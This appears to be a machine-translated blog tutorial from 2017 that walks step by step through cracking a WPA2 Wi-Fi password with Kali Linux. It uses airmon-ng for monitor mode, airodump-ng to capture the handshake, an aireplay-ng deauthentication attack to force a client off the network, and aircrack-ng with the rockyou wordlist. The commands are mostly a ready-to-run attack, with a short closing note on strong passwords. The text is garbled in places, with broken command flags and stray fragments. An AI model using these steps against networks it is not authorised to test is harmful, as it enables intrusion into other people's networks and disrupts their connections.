---
title: Use kali to crack wpa wifi
date: 2017-05-10 22:03:29
tags: 
categories: [Knowledge]
toc:
---
Well, nonsense not much to say, we enter today's theme, the use of kali linux on the wireless security tools wpa encryption wifi password crack. Because wep encryption is too little, so skip, choose to crack wpa. WPA crack is intercepted by the client and the router between the handshake package, according to the size of the dictionary for violent crack, that is the size of the dictionary directly determines the success of the crack or not.

Operating system: kali linux, hardware: wireless network card WN722N

(1) open the terminal: 
1. Enter `ifconfig`, see if the wireless card is loaded
2. Enter: `airmon-ng start wlan0` to start the network as a listening mode
The following are the same as the "

3. Enter: `airodump-ng wlan0mon` listen to network packets, if the following error, continue to implement the code in the figure.

Continue to enter: `airodump-ng wlan0mon`, there will be listening interface.

The following are the same as the "


From the monitoring interface, we can see the wifi mac address 8C: AB: 8E: A9: CB: 60, encryption: WPA2, where the channel 1.

This wifi now has a client that is being connected. Then start capturing the bag and grab the handshake bag.
 

4. Enter `airodump-ng -c 1 - bssid 8C: AB: 8E: A9: CB: 60 -w phi wlan0mon`

-c: Specifies the channel - bssid: Specifies wifi mac -w: Specifies the file that the crawled packet stores


5: At this time we need to open a terminal to cancel the verification attack, forcing the client has been connected to disconnect.

So when the client automatically connect, you can crawl the handshake package.


In the new terminal: `aireplay-ng -0 3 -a 8C: AB: 8E: A9: CB: 60-c 70: 1A: 04: B7: 1A: 90 wlan0mon`

-0: designated to cancel the verification attack 3: Attack times-a: designated ap mac-c: specified client mac


6: After the implementation of finished, after a while will be heard to listen to the handshake package.

The following are the same as the "


7: Since caught the handshake bag, `Ctrl + C` to stop capturing packets. Use aircrack-ng for violent crack.

In the terminal enter: `aircrack-ng-w /usr/share/wordlists/rockyou.txt phi-01.cap`

-w: specify the password used to break the dictionary phi-01.cap: This is before the crawl handbag packets

After about 5 minutes, the blasting was successful. There was a password in the brackets behind KEY FOUND.


(2) Summary:

1. Because WPA crack is the use of violence to crack the way (the router did not open wps), the larger the dictionary, the greater the possibility of cracking. So we try to set the complex password, multi-digit + letters.

2. Many people take hidden SSID, do not expose the wifi name way to prevent being cracked, the fact that there is no use, because the whole process does not need to know your wifi name.
